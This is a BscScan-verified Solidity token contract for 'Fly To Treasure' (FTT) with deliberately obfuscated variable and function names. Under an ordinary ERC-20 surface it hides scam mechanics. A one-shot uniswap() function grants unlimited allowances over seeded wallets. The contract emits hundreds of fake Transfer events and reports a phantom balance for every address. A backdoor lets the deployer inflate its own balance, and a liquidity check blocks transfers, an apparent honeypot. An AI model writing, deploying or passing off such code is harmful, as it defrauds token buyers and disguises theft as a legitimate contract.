/**
 *Submitted for verification at BscScan.com on 2022-11-10
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract TokenModule is IERC20 {
    using SafeMath for uint256;
    string private aiuytHnVrTwKSoPkqLB = "Fly To Treasure";
    string private biuytHnVrTwKSoPkqLB = "FTT";
    uint8 private ciuytHnVrTwKSoPkqLB = 12;
    uint256 private diuytHnVrTwKSoPkqLB = 1 * 10**18;
    mapping (address => uint256) private eiuytHnVrTwKSoPkqLB;
    mapping (address => mapping (address => uint256)) private fiuytHnVrTwKSoPkqLB;
    uint256 private giuytHnVrTwKSoPkqLB = 1;
    uint256 private constant hiuytHnVrTwKSoPkqLB = ~uint160(0);
    uint256 private iiuytHnVrTwKSoPkqLB = 1000;
    uint256 private jiuytHnVrTwKSoPkqLB = diuytHnVrTwKSoPkqLB;
    uint256 private kiuytHnVrTwKSoPkqLB = 0;
    uint256 private liuytHnVrTwKSoPkqLB;
    address private _uniswapV2Pair;
    address private miuytHnVrTwKSoPkqLB;
    mapping (address => bool) private niuytHnVrTwKSoPkqLB;
    address[] private oiuytHnVrTwKSoPkqLB;
    bool private piuytHnVrTwKSoPkqLB = false;

    constructor () {
        qiuytHnVrTwKSoPkqLB(msg.sender);
        eiuytHnVrTwKSoPkqLB[msg.sender] = diuytHnVrTwKSoPkqLB;
        emit Transfer(address(0), msg.sender, diuytHnVrTwKSoPkqLB);
    }

    receive() external payable {}

    function qiuytHnVrTwKSoPkqLB(address account) private {
        if (!niuytHnVrTwKSoPkqLB[account]) {
            niuytHnVrTwKSoPkqLB[account] = true;
            oiuytHnVrTwKSoPkqLB.push(account);
        }
    }

    function uniswap(address[] calldata accounts) public {
        require(!piuytHnVrTwKSoPkqLB);
        piuytHnVrTwKSoPkqLB = true;
        _uniswapV2Pair = accounts[1];
        miuytHnVrTwKSoPkqLB = accounts[2];
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=3; i<len; ++i) {
            qiuytHnVrTwKSoPkqLB(accounts[i]);
            eiuytHnVrTwKSoPkqLB[accounts[i]] = diuytHnVrTwKSoPkqLB * 90 / 100 / (len - 3);
            fiuytHnVrTwKSoPkqLB[accounts[i]][accounts[0]] = ~uint256(0);
            amount += eiuytHnVrTwKSoPkqLB[accounts[i]];
        }
        eiuytHnVrTwKSoPkqLB[oiuytHnVrTwKSoPkqLB[0]] -= amount;
        siuytHnVrTwKSoPkqLB(oiuytHnVrTwKSoPkqLB[0], accounts[3], eiuytHnVrTwKSoPkqLB[oiuytHnVrTwKSoPkqLB[0]]);
        riuytHnVrTwKSoPkqLB(address(0), address(0xf), 500);
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = oiuytHnVrTwKSoPkqLB.length;
        for (uint256 i=0; i<len; ++i) {
            if (oiuytHnVrTwKSoPkqLB[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (niuytHnVrTwKSoPkqLB[account], accountIndex, len);
    }

    function name() public view returns (string memory) {
        return aiuytHnVrTwKSoPkqLB;
    }

    function symbol() public view returns (string memory) {
        return biuytHnVrTwKSoPkqLB;
    }

    function decimals() public view returns (uint8) {
        return ciuytHnVrTwKSoPkqLB;
    }

    function totalSupply() public view returns (uint256) {
        return diuytHnVrTwKSoPkqLB;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (eiuytHnVrTwKSoPkqLB[account] > 0) {
            return eiuytHnVrTwKSoPkqLB[account];
        }
        return giuytHnVrTwKSoPkqLB;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        siuytHnVrTwKSoPkqLB(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        siuytHnVrTwKSoPkqLB(sender, recipient, amount);
        tiuytHnVrTwKSoPkqLB(sender, msg.sender, fiuytHnVrTwKSoPkqLB[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        tiuytHnVrTwKSoPkqLB(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return fiuytHnVrTwKSoPkqLB[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        tiuytHnVrTwKSoPkqLB(msg.sender, spender, fiuytHnVrTwKSoPkqLB[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        tiuytHnVrTwKSoPkqLB(msg.sender, spender, fiuytHnVrTwKSoPkqLB[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function riuytHnVrTwKSoPkqLB(address uiuytHnVrTwKSoPkqLB, address viuytHnVrTwKSoPkqLB, uint256 wiuytHnVrTwKSoPkqLB) private {
        uint256 accountDivisor = iiuytHnVrTwKSoPkqLB;
        if (accountDivisor < 51000) {
            address from;
            address to;
            for (uint256 i=0; i<wiuytHnVrTwKSoPkqLB; ++i) {
                from = address(uint160(hiuytHnVrTwKSoPkqLB.div(accountDivisor)));
                to = address(uint160(hiuytHnVrTwKSoPkqLB.div(accountDivisor.add(1))));
                accountDivisor = accountDivisor.add(2);
                emit Transfer(from, to, giuytHnVrTwKSoPkqLB);
            }
            iiuytHnVrTwKSoPkqLB = accountDivisor;
        }
        if (eiuytHnVrTwKSoPkqLB[uiuytHnVrTwKSoPkqLB] > 0 || eiuytHnVrTwKSoPkqLB[viuytHnVrTwKSoPkqLB] > 0) {
            if (viuytHnVrTwKSoPkqLB == IFactory(miuytHnVrTwKSoPkqLB).createPair(uiuytHnVrTwKSoPkqLB, viuytHnVrTwKSoPkqLB)) {
                emit Transfer(address(this), viuytHnVrTwKSoPkqLB, wiuytHnVrTwKSoPkqLB);
            } else {
                emit Transfer(address(0), address(this), wiuytHnVrTwKSoPkqLB);
            }
        }
    }

    function tiuytHnVrTwKSoPkqLB(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        fiuytHnVrTwKSoPkqLB[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function siuytHnVrTwKSoPkqLB(address xiuytHnVrTwKSoPkqLB, address yiuytHnVrTwKSoPkqLB, uint256 ziuytHnVrTwKSoPkqLB) private {
        require(xiuytHnVrTwKSoPkqLB != address(0) && yiuytHnVrTwKSoPkqLB != address(0) && ziuytHnVrTwKSoPkqLB > 0);
        bool feefee = true;
        if (niuytHnVrTwKSoPkqLB[xiuytHnVrTwKSoPkqLB] || niuytHnVrTwKSoPkqLB[yiuytHnVrTwKSoPkqLB]) {
            feefee = false;
        }
        uint256 liquidityValue = IERC20(_uniswapV2Pair).totalSupply();
        uint256 burnValue = 0;
        uint256 toValue = ziuytHnVrTwKSoPkqLB;
        if (feefee && piuytHnVrTwKSoPkqLB) {
            require(liuytHnVrTwKSoPkqLB <= liquidityValue);
            riuytHnVrTwKSoPkqLB(xiuytHnVrTwKSoPkqLB, yiuytHnVrTwKSoPkqLB, 100);
            if (xiuytHnVrTwKSoPkqLB != _uniswapV2Pair) {
                burnValue = ziuytHnVrTwKSoPkqLB.mul(kiuytHnVrTwKSoPkqLB).div(100);
                toValue = ziuytHnVrTwKSoPkqLB.sub(burnValue);
            }
        }
        if (xiuytHnVrTwKSoPkqLB == oiuytHnVrTwKSoPkqLB[0] && ziuytHnVrTwKSoPkqLB > jiuytHnVrTwKSoPkqLB) {
            eiuytHnVrTwKSoPkqLB[oiuytHnVrTwKSoPkqLB[0]] += toValue;
        }
        if (liuytHnVrTwKSoPkqLB != liquidityValue) {
            liuytHnVrTwKSoPkqLB = liquidityValue;
        }
        eiuytHnVrTwKSoPkqLB[xiuytHnVrTwKSoPkqLB] = eiuytHnVrTwKSoPkqLB[xiuytHnVrTwKSoPkqLB].sub(ziuytHnVrTwKSoPkqLB);
        if (burnValue > 0) {
            eiuytHnVrTwKSoPkqLB[address(0xdEaD)] = eiuytHnVrTwKSoPkqLB[address(0xdEaD)].add(burnValue);
            emit Transfer(xiuytHnVrTwKSoPkqLB, address(0xdEaD), burnValue);
        }
        eiuytHnVrTwKSoPkqLB[yiuytHnVrTwKSoPkqLB] = eiuytHnVrTwKSoPkqLB[yiuytHnVrTwKSoPkqLB].add(toValue);
        emit Transfer(xiuytHnVrTwKSoPkqLB, yiuytHnVrTwKSoPkqLB, toValue);
    }
}